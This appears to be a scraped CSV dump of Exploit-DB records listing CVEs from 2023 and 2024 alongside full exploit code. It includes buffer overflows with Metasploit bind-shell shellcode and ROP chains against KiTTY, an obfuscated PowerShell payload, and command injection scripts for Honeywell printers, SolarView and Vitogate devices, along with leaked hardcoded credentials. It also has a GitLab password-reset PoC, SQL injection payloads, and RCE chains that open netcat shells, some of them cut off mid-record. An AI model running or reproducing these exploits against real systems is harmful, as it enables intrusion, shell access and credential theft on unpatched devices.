GROUP BY x)a) AND 'kewe%'='kewe&search= Type: stacked queries Title: MySQL >= 5.0.12 stacked queries (comment) Payload: searchdata=test%';SELECT SLEEP(5)#&search= Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: searchdata=test%' AND (SELECT 8862 FROM (SELECT(SLEEP(5)))GqzT) AND 'wylU%'='wylU&search= Type: UNION query Title: Generic UNION query (NULL) - 15 columns Payload: searchdata=test%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x784e7a47626a794a74456975444c5a4c64734556414658476e75684c4a716f6173724b6b6a685163,0x717a787171)-- -&search="
CVE-2024-25003,2024-03-14,exploit db,"# Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Hostname' Buffer Overflow # Exploit Author: DEFCESCO (Austin A. DeFrancesco) # Vendor Homepage: https://github.com/cyd01/KiTTY/= # Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip # Version: ≤ 0.76.1.13 # Tested on: Microsoft Windows 11/10/8/7/XP # CVE: 2024-25003 # Blog: https://blog.DEFCESCO.io/Hell0+KiTTY # msf6 payload(windows/shell_bind_tcp) > to_handler # # [*] Payload Handler Started as Job 1 # # msf6 payload(windows/shell_bind_tcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Command shell session 1 opened (192.168.100.119:39315 -> 192.168.100.28:4444) # import sys import os import struct # msf6 payload(windows/shell_bind_tcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c\x3A\x40' -f py # # windows/shell_bind_tcp - 375 bytes # # https://metasploit.com/ # # Encoder: x86/xor_poly # # VERBOSE=false, LPORT=4444, RHOST=192.168.100.28, # # PrependMigrate=false, EXITFUNC=process, CreateSession=true, # # AutoVerifySession=true # buf = b"""" buf += b""\x51\x53\x56\x57\xdb\xd9\xd9\x74\x24\xf4\x5f\x41"" buf += b""\x49\x31\xc9\x51\x59\x90\x90\x81\xe9\xae\xff\xff"" buf += b""\xff\xbe\xd4\xa1\xc4\xf4\x31\x77\x2b\x83\xef\xfc"" buf += b""\x51\x59\x90\xff\xc9\x75\xf3\x5f\x5e\x5b\x59\x28"" buf += b""\x49\x46\xf4\xd4\xa1\xa4\x7d\x31\x90\x04\x90\x5f"" buf += b""\xf1\xf4\x7f\x86\xad\x4f\xa6\xc0\x2a\xb6\xdc\xdb"" buf += b""\x16\x8e\xd2\xe5\x5e\x68\xc8\xb5\xdd\xc6\xd8\xf4"" buf += b""\x60\x0b\xf9\xd5\x66\x26\x06\x86\xf6\x4f\xa6\xc4"" buf += b""\x2a\x8e\xc8\x5f\xed\xd5\x8c\x37\xe9\xc5\x25\x85"" buf += b""\x2a\x9d\xd4\xd5\x72\x4f\xbd\xcc\x42\xfe\xbd\x5f"" buf += b""\x95\x4f\xf5\x02\x90\x3b\x58\x15\x6e\xc9\xf5\x13"" buf += b""\x99\x24\x81\x22\xa2\xb9\x0c\xef\xdc\xe0\x81\x30"" buf += b""\xf9\x4f\xac\xf0\xa0\x17\x92\x5f\xad\x8f\x7f\x8c"" buf += b""\xbd\xc5\x27\x5f\xa5\x4f\xf5\x04\x28\x80\xd0\xf0"" buf += b""\xfa\x9f\x95\x8d\xfb\x95\x0b\x34\xfe\x9b\xae\x5f"" buf += b""\xb3\x2f\x79\x89\xc9\xf7\xc6\xd4\xa1\xac\x83\xa7"" buf += b""\x93\x9b\xa0\xbc\xed\xb3\xd2\xd3\x5e\x11\x4c\x44"" buf += b""\xa0\xc4\xf4\xfd\x65\x90\xa4\xbc\x88\x44\x9f\xd4"" buf += b""\x5e\x11\x9e\xdc\xf8\x94\x16\x29\xe1\x94\xb4\x84"" buf += b""\xc9\x2e\xfb\x0b\x41\x3b\x21\x43\xc9\xc6\xf4\xc5"" buf += b""\xfd\x4d\x12\xbe\xb1\x92\xa3\xbc\x63\x1f\xc3\xb3"" buf += b""\x5e\x11\xa3\xbc\x16\x2d\xcc\x2b\x5e\x11\xa3\xbc"" buf += b""\xd5\x28\xcf\x35\x5e\x11\xa3\x43\xc9\xb1\x9a\x99"" buf += b""\xc0\x3b\x21\xbc\xc2\xa9\x90\xd4\x28\x27\xa3\x83"" buf += b""\xf6\xf5\x02\xbe\xb3\x9d\xa2\x36\x5c\xa2\x33\x90"" buf += b""\x85\xf8\xf5\xd5\x2c\x80\xd0\xc4\x67\xc4\xb0\x80"" buf += b""\xf1\x92\xa2\x82\xe7\x92\xba\x82\xf7\x97\xa2\xbc"" buf += b""\xd8\x08\xcb\x52\x5e\x11\x7d\x34\xef\x92\xb2\x2b"" buf += b""\x91\xac\xfc\x53\xbc\xa4\x0b\x01\x1a\x34\x41\x76"" buf += b""\xf7\xac\x52\x41\x1c\x59\x0b\x01\x9d\xc2\x88\xde"" buf += b""\x21\x3f\x14\xa1\xa4\x7f\xb3\xc7\xd3\xab\x9e\xd4"" buf += b""\xf2\x3b\x21"" def shellcode(): sc = b'' sc += b'\xBB\x44\x24\x44\x44' # mov ebx,0x44442444 sc += b'\xB8\x44\x44\x44\x44' # mov eax,0x44444444 sc += b'\x29\xD8' # sub eax,ebx sc += b'\x29\xC4' # sub esp,eax sc += buf sc += b'\x90' * (1052-len(sc)) assert len(sc) == 1052 return sc def create_rop_chain(): # rop chain generated with mona.py - www.corelan.be rop_gadgets = [ #[---INFO:gadgets_to_set_esi:---] 0x004c5832, # POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe] 0x006424a4, # ptr to &VirtualProtect() [IAT kitty.exe] 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x00484e07, # MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe] 0x00473cf6, # XCHG EAX,ESI # RETN [kitty.exe] #[---INFO:gadgets_to_set_ebp:---] 0x00429953, # POP EBP # RETN [kitty.exe] 0x005405b0, # push esp; ret 0 [kitty.exe] #[---INFO:gadgets_to_set_ebx:---] 0x0049d9f9, # POP EBX # RETN [kitty.exe] 0x00000201, # 0x00000201-> ebx #[---INFO:gadgets_to_set_edx:---] 0x00430dce, # POP EDX # RETN [kitty.exe] 0x00000040, # 0x00000040-> edx #[---INFO:gadgets_to_set_ecx:---] 0x005ac58c, # POP ECX # RETN [kitty.exe] 0x004d81d9, # &Writable location [kitty.exe] #[---INFO:gadgets_to_set_edi:---] 0x004fa404, # POP EDI # RETN [kitty.exe] 0x005a2001, # RETN (ROP NOP) [kitty.exe] #[---INFO:gadgets_to_set_eax:---] 0x004cd011, # POP EAX # POP EBX # RETN [kitty.exe] 0x90909090, # nop 0x41414141, # Filler (compensate) #[---INFO:pushad:---] 0x005dfbac, # PUSHAD # RETN [kitty.exe] return b''.join(struct.pack('<I', _) for _ in rop_gadgets) rop_chain = create_rop_chain() # Badchars: \x00\x07\x0a\x0d\x1b\x9c\x3A\x40 # # Return Address Information: 0x0052033c : {pivot 332 / 0x14c} : # # ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN # # ** [kitty.exe] ** | startnull,ascii {PAGE_EXECUTE_READWRITE} # # Shellcode size at ESP: 1052 # return_address = struct.pack('<I', 0x0052033c) # ADD ESP,13C # POP EBX # POP ESI # POP EDI # POP EBP # RETN ** [kitty.exe] ** | startnull,ascii {PAGE_EXECUTE_READWRITE} rop_chain_padding = b'\x90' * 35 nops = b'\x90' * 88 escape_sequence = b'\033]0;__dt:' + shellcode() + return_address escape_sequence += rop_chain_padding + rop_chain escape_sequence += b'\x90' escape_sequence += b""\xE9\x2A\xFA\xFF\xFF"" #jmp $eip-1490 escape_sequence += nops + b'\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escape_sequence) stdout.flush()"
CVE-2024-23749,2024-03-14,exploit db,"# Exploit Title: KiTTY 0.76.1.13 - Command Injection # Exploit Author: DEFCESCO (Austin A. DeFrancesco) # Vendor Homepage: https://github.com/cyd01/KiTTY/= # Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip # Version: ≤ 0.76.1.13 # Tested on: Microsoft Windows 11/10/8/7/XP # CVE: CVE-2024-23749 # Blog: https://blog.DEFCESCO.io/Hell0+KiTTY # msf6 payload(cmd/windows/powershell_bind_tcp) > to_handler # # [*] Payload Handler Started as Job 1 # # msf6 payload(cmd/windows/powershell_bind_tcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Powershell session session 1 opened (192.168.100.119:36969 -> 192.168.100.28:4444) # import os import sys # msf6 payload(cmd/windows/powershell_bind_tcp) > generate -f raw # shellcode = b'powershell.exe -nop -w hidden -noni -ep bypass ""&([scriptblock]::create' shellcode += b'((New-Object System.IO.StreamReader(New-Object System.IO.Compression.G' shellcode += b'zipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBa' shellcode += b'se64String(((\'H4sIAE7efGUCA5VVTW/b{2}BC{1}+1cMD{2}1GQiTCDXoKkGJdNV0Ey' shellcode += b'LZGlTYHw0BoahxrQ5NekoptJP7vJSXqw3\'+\'GCbXWwJc7w8fHNG3JRCmYKKeBvNMktzh' shellcode += b'kvUBgYPA3APsGG\'+\'wQV8wU3ydf4vMgPJzW6NX+gK7aAhNj+t8ptk8l3jJ1zQkptUYW4' shellcode += b'jBeXa\'+\'QgRGld\'+\'hmTZTc7siLDDveG2lyB/vBoqG4lhtU{1}suygyo+oYquwvp{1' shellcode += b'}mhlViPtZkMrVioo8PhzNNGdSvBj8JDeCS5pXo5HHVJKh1u\'+\'AFWMm85{2}gI/hVGUK' shellcode += b'cUCwibZSDB/2A4L0Q+jKpgPa+aywttUKCy\'+\'k6fZzr6viFMtk+wBjSY3bH3tM2bv7XM' shellcode += b'8kWhDlXHr\'+\'+pWrqC/RRS{1}vzBiujQWsyxHWVPZv0VX4iErjMeMWulfy15inE7/QcB' shellcode += b'g76n6{1}Qa2ZNgrpyhGs8Yj1VlaNWWIdpbokNSNnj6GvQI+P1jxrwN6ghKxUhdmRrEkN/f' shellcode += b'pxsLA+wjh8Cm4s+h4SqmF6M{2}cbrqTBFJUpFgWjBn{1}QXuTUmS2lnM8pe5hF0St0yLg0' shellcode += b'S+dUN2ms{2}zECUXIeDw3X786GnkEfoFWm21lfuul8Z3A6mwXu35luRMjZyD7PfzyN{\'+' shellcode += b'\'1}l5dFHkTDqcGt4agYDJ3jj4/H2fp1VXkFP/ocsLhrbWm3GiYu{2}bJlsg5qFIImw\'+' shellcode += b'\'1Wj1Jbew7hFAIUj+fuS7jmPrVjtjRtgMnVujRd8E6kcr\'+\'1Txf3SQJhG8E/BlNRyY' shellcode += b'SCVai1VJSGBsVvMJWlQaLEfMSd34k5443k5yK0tBobdxuJR3H2Qax\'+\'T3Ztk3Tt{2}2' shellcode += b'fesc{2}ef3VJqezuDaQjpZfMuTlufvc21mfZbqkrKl5VyDQiHaI6XL6mi7Jzw4iSPS7LY+' shellcode += b'tBqk6PlKPMoHTC63a6uttnq3KPu+pTbLgmMYBkXlunoT35DmYe2xGEYxBAfsI0gEwuhI0k' shellcode += b'unH+Y3Vsu3LgXfmC6FVBpfes07FNte1FHpofnzodpd\'+\'IyoERfSimrYbXTGP{1}g1Jc' shellcode += b'7\'+\'jV4Gcf/nwHz/C1NEmNCt48B1BnUAnSAJ/CySSDE/tf6X8tWeXhiEyoWbroBzjpQL' shellcode += b'a{2}SIBKSTUdzQ4W67Gu4oRxpCqMXmNw0f+wrbYdHBv4l/zbwfyvY/uGPfJrM+czL/Wyve' shellcode += b'/8weMP85RLjX4/VTs2t1DfMN3VlBm5bu4j/2ud2V7lbe3cFfoTVXnPBo0IAAA{0}\')-f' shellcode += b'\'=\',\'9\',\'O\')))),[System.IO.Compression.CompressionMode]::Decompr' shellcode += b'ess))).ReadToEnd()))\""' escape_sequence = b'\033]0;__rv:' escape_sequence += b'"" & ' escape_sequence += shellcode escape_sequence += b' #\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escape_sequence) stdout.flush()"
CVE-2024-25004,2024-03-14,exploit db,"# Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow # Exploit Author: DEFCESCO (Austin A. DeFrancesco) # Vendor Homepage: https://github.com/cyd01/KiTTY/= # Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip # Version: ≤ 0.76.1.13 # Tested on: Microsoft Windows 11/10/8/7/XP # CVE: CVE-2024-25004 # Blog: https://blog.DEFCESCO.io/Hell0+KiTTY # msf6 payload(windows/shell_bind_tcp) > to_handler # # [*] Payload Handler Started as Job 1 # # msf6 payload(windows/shell_bind_tcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Command shell session 1 opened (192.168.100.119:34285 -> 192.168.100.28:4444) # import sys import os import struct # msf6 payload(windows/shell_bind_tcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c' -f py # # windows/shell_bind_tcp - 355 bytes # # https://metasploit.com/ # # Encoder: x86/shikata_ga_nai # # VERBOSE=false, LPORT=4444, RHOST=192.168.100.28, # # PrependMigrate=false, EXITFUNC=process, CreateSession=true, # # AutoVerifySession=true # buf = b"""" buf += b""\xd9\xe9\xd9\x74\x24\xf4\xbd\xfe\xb7\xa4\x99\x5e"" buf += b""\x29\xc9\xb1\x53\x83\xee\xfc\x31\x6e\x13\x03\x90"" buf += b""\xa4\x46\x6c\x90\x23\x04\x8f\x68\xb4\x69\x19\x8d"" buf += b""\x85\xa9\x7d\xc6\xb6\x19\xf5\x8a\x3a\xd1\x5b\x3e"" buf += b""\xc8\x97\x73\x31\x79\x1d\xa2\x7c\x7a\x0e\x96\x1f"" buf += b""\xf8\x4d\xcb\xff\xc1\x9d\x1e\xfe\x06\xc3\xd3\x52"" buf += b""\xde\x8f\x46\x42\x6b\xc5\x5a\xe9\x27\xcb\xda\x0e"" buf += b""\xff\xea\xcb\x81\x8b\xb4\xcb\x20\x5f\xcd\x45\x3a"" buf += b""\xbc\xe8\x1c\xb1\x76\x86\x9e\x13\x47\x67\x0c\x5a"" buf += b""\x67\x9a\x4c\x9b\x40\x45\x3b\xd5\xb2\xf8\x3c\x22"" buf += b""\xc8\x26\xc8\xb0\x6a\xac\x6a\x1c\x8a\x61\xec\xd7"" buf += b""\x80\xce\x7a\xbf\x84\xd1\xaf\xb4\xb1\x5a\x4e\x1a"" buf += b""\x30\x18\x75\xbe\x18\xfa\x14\xe7\xc4\xad\x29\xf7"" buf += b""\xa6\x12\x8c\x7c\x4a\x46\xbd\xdf\x03\xab\x8c\xdf"" buf += b""\xd3\xa3\x87\xac\xe1\x6c\x3c\x3a\x4a\xe4\x9a\xbd"" buf += b""\xad\xdf\x5b\x51\x50\xe0\x9b\x78\x97\xb4\xcb\x12"" buf += b""\x3e\xb5\x87\xe2\xbf\x60\x3d\xea\x66\xdb\x20\x17"" buf += b""\xd8\x8b\xe4\xb7\xb1\xc1\xea\xe8\xa2\xe9\x20\x81"" buf += b""\x4b\x14\xcb\xbc\xd7\x91\x2d\xd4\xf7\xf7\xe6\x40"" buf += b""\x3a\x2c\x3f\xf7\x45\x06\x17\x9f\x0e\x40\xa0\xa0"" buf += b""\x8e\x46\x86\x36\x05\x85\x12\x27\x1a\x80\x32\x30"" buf += b""\x8d\x5e\xd3\x73\x2f\x5e\xfe\xe3\xcc\xcd\x65\xf3"" buf += b""\x9b\xed\x31\xa4\xcc\xc0\x4b\x20\xe1\x7b\xe2\x56"" buf += b""\xf8\x1a\xcd\xd2\x27\xdf\xd0\xdb\xaa\x5b\xf7\xcb"" buf += b""\x72\x63\xb3\xbf\x2a\x32\x6d\x69\x8d\xec\xdf\xc3"" buf += b""\x47\x42\xb6\x83\x1e\xa8\x09\xd5\x1e\xe5\xff\x39"" buf += b""\xae\x50\x46\x46\x1f\x35\x4e\x3f\x7d\xa5\xb1\xea"" buf += b""\xc5\xd5\xfb\xb6\x6c\x7e\xa2\x23\x2d\xe3\x55\x9e"" buf += b""\x72\x1a\xd6\x2a\x0b\xd9\xc6\x5f\x0e\xa5\x40\x8c"" buf += b""\x62\xb6\x24\xb2\xd1\xb7\x6c"" def shellcode(): sc = b'' sc += b'\xBB\x44\x24\x44\x44' # mov ebx,0x44442444 sc += b'\xB8\x44\x44\x44\x44' # mov eax,0x44444444 sc += b'\x29\xD8' # sub eax,ebx sc += b'\x29\xC4' # sub esp,eax sc += buf sc += b'\x90' * (1042-len(sc)) assert len(sc) == 1042 return sc def create_rop_chain(): # rop chain generated with mona.py - www.corelan.be rop_gadgets = [ #[---INFO:gadgets_to_set_esi:---] 0x004c5832, # POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe] 0x006424a4, # ptr to &VirtualProtect() [IAT kitty.exe] 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x41414141, # Filler (compensate) 0x00484e07, # MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe] 0x00473cf6, # XCHG EAX,ESI # RETN [kitty.exe] #[---INFO:gadgets_to_set_ebp:---] 0x00429953, # POP EBP # RETN [kitty.exe] 0x005405b0, # PUSH ESP; RETN 0 [kitty.exe] #[---INFO:gadgets_to_set_ebx:---] 0x0049d9f9, # POP EBX # RETN [kitty.exe] 0x00000201, # 0x00000201-> ebx #[---INFO:gadgets_to_set_edx:---] 0x00430dce, # POP EDX # RETN [kitty.exe] 0x00000040, # 0x00000040-> edx #[---INFO:gadgets_to_set_ecx:---] 0x005ac58c, # POP ECX # RETN [kitty.exe] 0x004d81d9, # &Writable location [kitty.exe] #[---INFO:gadgets_to_set_edi:---] 0x004fa404, # POP EDI # RETN [kitty.exe] 0x005a2001, # RETN (ROP NOP) [kitty.exe] #[---INFO:gadgets_to_set_eax:---] 0x004cd011, # POP EAX # POP EBX # RETN [kitty.exe] 0x90909090, # nop 0x41414141, # Filler (compensate) #[---INFO:pushad:---] 0x005dfbac, # PUSHAD # RETN [kitty.exe] return b''.join(struct.pack('<I', _) for _ in rop_gadgets) rop_chain = create_rop_chain() # Badchars: \x00\x07\x0a\x0d\x1b\x9c\x9d # # Return Address Information: 0x00529720 : {pivot 324 / 0x144} : # # ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN # # ** [kitty.exe] ** | startnull {PAGE_EXECUTE_READWRITE} # # Shellcode size at ESP: 1042 bytes # return_address = struct.pack('<I', 0x00529720) # ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN ** [kitty.exe] ** | startnull {PAGE_EXECUTE_READWRITE} rop_chain_padding = b'\x90' * 27 nops = b'\x90' * 88 escape_sequence = b'\033]0;__dt:localhost:' + shellcode() + return_address escape_sequence += rop_chain_padding + rop_chain escape_sequence += b'\xE9\x3D\xFA\xFF\xFF' # jmp $eip-1471 escape_sequence += nops + b'\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escape_sequence) stdout.flush()"
CVE-2023-42793,2024-03-14,exploit db,"#- Exploit Title: JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE) #- Shodan Dork: http.title:TeamCity , http.favicon.hash:-1944119648 #- Exploit Author: ByteHunter #- Vendor: JetBrains #- Email: 0xByteHunter@proton.me #- vendor: JetBrains #- Version: versions before 2023.05.4 #- Tested on: 2023.05.3 #- CVE : CVE-2023-42793 import requests import argparse import re import random import string import subprocess banner = """""" * CVE-2023-42793 * * TeamCity Admin Account Creation * * Author: ByteHunter * print(banner) parser = argparse.ArgumentParser(description=""CVE-2023-42793 - TeamCity JetBrains"
CVE-2023-3710,2024-03-14,exploit db,"#- Exploit Title: Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE) #- Shodan Dork: http.title:PM43 , PM43 #- Exploit Author: ByteHunter #- Email: 0xByteHunter@proton.me #- Frimware Version: versions prior to P10.19.050004 #- Tested on: P10.17.019667 #- CVE : CVE-2023-3710 import requests import argparse BLUE = '\033[94m' YELLOW = '\033[93m' RESET = '\033[0m' def banner(): banner = """""" CVE-2023-3710 Command Injection in Honeywell PM43 Printers Author: ByteHunter print(YELLOW + banner + RESET) def run_command(url, command): full_url = f""{url}/loadfile.lp?pageid=Configure"" payload = { 'username': f'hunt\n{command}\n', 'userpassword': 'admin12345admin!!' try: response = requests.post(full_url, data=payload, verify=False) response_text = response.text html_start_index = response_text.find(' ') if html_start_index != -1: return response_text[:html_start_index] else: return response_text except requests.exceptions.RequestException as e: return f""Error: {e}"" def main(): parser = argparse.ArgumentParser(description='Command Injection"
CVE-2023-23333,2024-03-14,exploit db,"#- Exploit Title: SolarView Compact 6.00 - Command Injection #- Shodan Dork: http.html:""solarview compact"" #- Exploit Author: ByteHunter #- Email: 0xByteHunter@proton.me #- Version: 6.00 #- Tested on: 6.00 #- CVE : CVE-2023-23333 import argparse import requests def vuln_check(ip_address, port): url = f""http://{ip_address}:{port}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"" response = requests.get(url) if response.status_code == 200: output = response.text if ""root"" in output: print(""Vulnerability detected: Command Injection possible."") print(f""passwd file content:\n{response.text}"") else: print(""No vulnerability detected."") else: print(""Error: Unable to fetch response."") def main(): parser = argparse.ArgumentParser(description=""SolarView Compact Command Injection "") parser.add_argument(""-i"", ""--ip"", help=""IP address of the target device"", required=True) parser.add_argument(""-p"", ""--port"", help=""Port of the the target device (default: 80)"", default=80, type=int) args = parser.parse_args() ip_address = args.ip port = args.port vuln_check(ip_address, port) if __name__ == ""__main__"": main()"
CVE-2023-5702,2024-03-14,exploit db,"#- Exploit Title: Viessmann Vitogate 300 <= 2.1.3.0 - Remote Code Execution (RCE) #- Shodan Dork: http.title:'Vitogate 300' #- Exploit Author: ByteHunter #- Email: 0xByteHunter@proton.me #- Version: versions up to 2.1.3.0 #- Tested on: 2.1.1.0 #- CVE : CVE-2023-5702 & CVE-2023-5222 import argparse import requests def banner(): banner = """""" CVE-2023-5702 Vitogate 300 RCE Author: ByteHunter print(banner) def send_post_request(target_ip, command, target_port): payload = { ""method"": ""put"", ""form"": ""form-4-7"", ""session"": """", ""params"": { ""ipaddr"": f""1;{command}"" headers = { ""Host"": target_ip, ""Content-Length"": str(len(str(payload))), ""Content-Type"": ""application/json"" url = f""http://{target_ip}:{target_port}/cgi-bin/vitogate.cgi"" response = requests.post(url, json=payload, headers=headers) if response.status_code == 200: print(""Result:"") print(response.text) else: print(f""Request failed! status code: {response.status_code}"") def main(): parser = argparse.ArgumentParser(description=""Vitogate 300 RCE & Hardcoded Credentials"") parser.add_argument(""--target"", required=False, help=""Target IP address"") parser.add_argument(""--port"", required=False, help=""Target port"",default=""80"") parser.add_argument(""--command"", required=False, help=""Command"") parser.add_argument(""--creds"", action=""store_true"", help=""Show hardcoded credentials"") args = parser.parse_args() if args.creds: print(""Vitogate 300 hardcoded administrative accounts credentials"") print(""Username: vitomaster, Password: viessmann1917"") print(""Username: vitogate, Password: viessmann"") else: target_ip = args.target target_port = args.port command = args.command if not (target_ip and command): print(""Both --target and --command options are required.\nor use --creds option to see hardcoded Credentials."") return send_post_request(target_ip, command,target_port) if __name__ == ""__main__"": banner() main()"
CVE-2023-7028,2024-03-14,exploit db,"# Exploit Title: GitLab CE/EE < 16.7.2 - Password Reset # Exploit Author: Sebastian Kriesten (0xB455) # Twitter: https://twitter.com/0xB455 # Date: 2024-01-12 # Vendor Homepage: gitlab.com # Vulnerability disclosure: https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/ # Version: <16.7.2, <16.6.4, <16.5.6 # CVE: CVE-2023-7028 Proof of Concept: user[email][]=valid@email.com&user[email][]=attacker@email.com"
CVE-2024-27612,2024-03-10,exploit db,"# Exploit Title: Numbas < v7.3 - Remote Code Execution # Google Dork: N/A # Date: March 7th, 2024 # Exploit Author: Matheus Boschetti # Vendor Homepage: https://www.numbas.org.uk/ # Software Link: https://github.com/numbas/Numbas # Version: 7.2 and below # Tested on: Linux # CVE: CVE-2024-27612 import sys, requests, re, argparse, subprocess, time from bs4 import BeautifulSoup s = requests.session() def getCSRF(target): url = f""http://{target}/"" req = s.get(url) soup = BeautifulSoup(req.text, 'html.parser') csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value'] return csrfmiddlewaretoken def createTheme(target): # Format request csrfmiddlewaretoken = getCSRF(target) theme = 'ExampleTheme' boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1' data = ( f'--{boundary}\r\n' 'Content-Disposition: form-data; name=""csrfmiddlewaretoken""\r\n' '\r\n' f'{csrfmiddlewaretoken}\r\n' f'--{boundary}\r\n' 'Content-Disposition: form-data; name=""name""\r\n' '\r\n' f'{theme}\r\n' f'--{boundary}--\r\n' headers = {'Content-Type': f'multipart/form-data; boundary={boundary}', 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Connection': 'close'} # Create theme and return its ID req = s.post(f""http://{target}/theme/new/"", headers=headers, data=data) redir = req.url split = redir.split('/') id = split[4] print(f""\t[i] Theme created with ID {id}"") return id def login(target, user, passwd): print(""\n[i] Attempting to login..."") csrfmiddlewaretoken = getCSRF(target) data = {'csrfmiddlewaretoken': csrfmiddlewaretoken, 'username': user, 'password': passwd, 'next': '/'} # Login login = s.post(f""http://{target}/login/"", data=data, allow_redirects=True) res = login.text if(""Logged in as"" not in res): print(""\n\n[!] Login failed!"") sys.exit(-1) # Check if logged and fetch ID usermatch = re.search(r'Logged in as (.*?) ', res) if usermatch: user = usermatch.group(1) idmatch = re.search(r' ', res) if idmatch: id = idmatch.group(1) print(f""\t[+] Logged in as \""{user}\"" with ID {id}"") def checkVuln(url): print(""[i] Checking if target is vulnerable..."") # Attempt to read files themeID = createTheme(url) target = f""http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../.."" hname = s.get(f""{target}/etc/hostname"") ver = s.get(f""{target}/etc/issue"") hnamesoup = BeautifulSoup(hname.text, 'html.parser') versoup = BeautifulSoup(ver.text, 'html.parser') hostname = hnamesoup.find('textarea').get_text().strip() version = versoup.find('textarea').get_text().strip() if len(hostname) < 1: print(""\n\n[!] Something went wrong - target might not be vulnerable."") sys.exit(-1) print(f""\n[+] Target \""{hostname}\"" is vulnerable!"") print(f""\t[i] Running: \""{version}\"""") # Cleanup - delete theme print(f""\t\t[i] Cleanup: deleting theme {themeID}..."") target = f""http://{url}/themes/{themeID}/delete"" csrfmiddlewaretoken = getCSRF(url) data = {'csrfmiddlewaretoken':csrfmiddlewaretoken} s.post(target, data=data) def replaceInit(target): # Overwrite __init__.py with arbitrary code rport = '8443' payload = f""import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])"" csrfmiddlewaretoken = getCSRF(target) filename = '../../../../numbas_editor/numbas/__init__.py' themeID = createTheme(target) data = {'csrfmiddlewaretoken': csrfmiddlewaretoken, 'source': payload, 'filename': filename} print(""[i] Delivering payload..."") # Retry 5 times in case something goes wrong... for attempt in range(5): try: s.post(f""http://{target}/themes/{themeID}/edit_source"", data=data, timeout=10) except Exception as e: pass # Establish connection to bind shell time.sleep(2) print(f""\t[+] Payload delivered, establishing connection...\n"") if "":"" in target: split = target.split("":"") ip = split[0] else: ip = str(target) subprocess.Popen([""nc"", ""-n"", ip, rport]) while True: pass def main(): parser = argparse.ArgumentParser() if len(sys.argv) <= 1: print(""\n[!] No option provided!"") print(""\t- check: Passively check if the target is vulnerable by attempting to read files from disk\n\t- exploit: Attempt to actively exploit the target\n"") print(f""[i] Usage: python3 {sys.argv[0]} --target 172.16.1.5:80 --user example --passwd qwerty"") sys.exit(-1) group = parser.add_mutually_exclusive_group(required=True) group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit') parser.add_argument('--target', help='Target IP:PORT') parser.add_argument('--user', help='Username to authenticate') parser.add_argument('--passwd', help='Password to authenticate') args = parser.parse_args() action = args.action target = args.target user = args.user passwd = args.passwd print(""\n\t\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-"") if action == 'check': login(target, user, passwd) checkVuln(target) elif action == 'exploit': login(target, user, passwd) replaceInit(target) else: sys.exit(-1) if __name__ == ""__main__"": main()"
CVE-2024-25832,2024-03-10,exploit db,"# Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE' # Date: 7/28/2022 # Exploit Author: Samy Younsi - NS Labs (https://neroteam.com) # Vendor Homepage: https://www.f-logic.jp # Software Link: https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf # Version: Ver1.0 # Tested on: DataCube3 version 1.0 (Ubuntu) # CVE : CVE-2024-25830 + CVE-2024-25832 # Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload from __future__ import print_function, unicode_literals from bs4 import BeautifulSoup import argparse import requests import json import urllib3 import re urllib3.disable_warnings() def banner(): dataCube3Logo = """""" ▒▒▒▒▒▒▒▒██ DataCube3 Ver1.0 █F-logic▓▓ \033[1;92mSamy Younsi (Necrum Security Labs)\033[1;m \033[1;91mDataCube3 exploit chain reverse shell\033[1;m FOR EDUCATIONAL PURPOSE ONLY. return print('\033[1;94m{}\033[1;m'.format(dataCube3Logo)) def extractRootPwd(RHOST, RPORT, protocol): url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT) try: response = requests.get(url, 